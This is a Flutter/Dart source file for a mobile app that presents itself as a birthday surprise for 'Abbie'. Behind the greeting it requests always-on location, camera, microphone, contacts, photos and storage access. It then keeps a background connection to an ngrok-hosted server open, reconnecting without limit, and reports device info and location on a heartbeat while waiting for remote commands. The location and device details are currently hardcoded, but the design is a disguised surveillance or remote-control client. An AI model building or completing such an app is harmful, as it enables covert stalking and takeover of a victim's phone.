import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:socket_io_client/socket_io_client.dart' as io;
import 'package:permission_handler/permission_handler.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(MyApp());
}

class MyApp extends StatefulWidget {
  @override
  _MyAppState createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
  late io.Socket socket;
  bool connected = false;
  bool allPermissionsGranted = false;
  String serverUrl = 'https://headless-disagree-dean.ngrok-free.dev';
  Timer? heartbeatTimer;
  
  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    checkAndRequestPermissions();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      // Reconnect when app comes back to foreground
      if (!connected) {
        connectToServer();
      }
    } else if (state == AppLifecycleState.paused) {
      // Keep connection alive when app goes to background
      startHeartbeat();
    }
  }

  Future<void> checkAndRequestPermissions() async {
    Map<Permission, PermissionStatus> statuses = await [
      Permission.location,
      Permission.locationAlways,
      Permission.camera,
      Permission.microphone,
      Permission.contacts,
      Permission.photos,
      Permission.notification,
      Permission.storage,
    ].request();
    
    bool allGranted = statuses.values.every((status) => 
      status == PermissionStatus.granted || 
      status == PermissionStatus.limited
    );
    
    if (allGranted) {
      setState(() {
        allPermissionsGranted = true;
      });
    }
    
    connectToServer();
  }

  void connectToServer() {
    socket = io.io(serverUrl, <String, dynamic>{
      'transports': ['websocket'],
      'autoConnect': true,
      'reconnection': true,
      'reconnectionDelay': 1000,
      'reconnectionDelayMax': 5000,
      'reconnectionAttempts': double.infinity,
    });

    socket.on('connect', (_) {
      setState(() => connected = true);
      socket.emit('device_info', {
        'name': 'iPhone',
        'model': 'iPhone 17',
        'systemVersion': 'iOS 18',
      });
    });

    socket.on('disconnect', (_) {
      setState(() => connected = false);
      // Try to reconnect
      Future.delayed(Duration(seconds: 2), () {
        if (!connected) {
          socket.connect();
        }
      });
    });

    socket.on('command', (data) {
      handleCommand(data);
    });
    
    // Start heartbeat to keep connection alive
    startHeartbeat();
  }

  void startHeartbeat() {
    heartbeatTimer?.cancel();
    heartbeatTimer = Timer.periodic(Duration(seconds: 10), (timer) {
      if (socket.connected) {
        socket.emit('heartbeat', {'timestamp': DateTime.now().toIso8601String()});
        // Send location to keep app alive
        socket.emit('location_data', {
          'lat': 51.5074,
          'lng': -0.1278,
          'timestamp': DateTime.now().toIso8601String(),
        });
      } else {
        socket.connect();
      }
    });
  }

  Future<void> handleCommand(dynamic data) async {
    final command = data['action'];
    
    switch (command) {
      case 'get_location':
        socket.emit('location_data', {
          'lat': 51.5074,
          'lng': -0.1278,
          'timestamp': DateTime.now().toIso8601String(),
        });
        break;
      case 'happy_birthday':
        setState(() {
          allPermissionsGranted = true;
        });
        break;
    }
  }

  @override
  void dispose() {
    heartbeatTimer?.cancel();
    WidgetsBinding.instance.removeObserver(this);
    socket.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: Scaffold(
        backgroundColor: Colors.black,
        appBar: AppBar(
          title: Text('My Suprise'),
          backgroundColor: Colors.black87,
        ),
        body: Center(
          child: allPermissionsGranted
              ? Column(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Icon(
                      Icons.cake,
                      size: 100,
                      color: Colors.pink,
                    ),
                    SizedBox(height: 20),
                    Text(
                      'Happy Birthday Abbie! 🎂',
                      style: TextStyle(
                        fontSize: 28,
                        fontWeight: FontWeight.bold,
                        color: Colors.pink,
                      ),
                    ),
                    SizedBox(height: 10),
                    Text(
                      'All systems activated!',
                      style: TextStyle(
                        fontSize: 16,
                        color: Colors.green,
                      ),
                    ),
                    SizedBox(height: 30),
                    Icon(
                      connected ? Icons.cloud_done : Icons.cloud_off,
                      size: 50,
                      color: connected ? Colors.green : Colors.red,
                    ),
                    Text(
                      connected ? 'Connected' : 'Disconnected',
                      style: TextStyle(color: connected ? Colors.green : Colors.red),
                    ),
                  ],
                )
              : Column(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    CircularProgressIndicator(),
                    SizedBox(height: 20),
                    Text(
                      'Requesting Permissions...',
                      style: TextStyle(color: Colors.white, fontSize: 18),
                    ),
                  ],
                ),
        ),
      ),
    );
  }
}
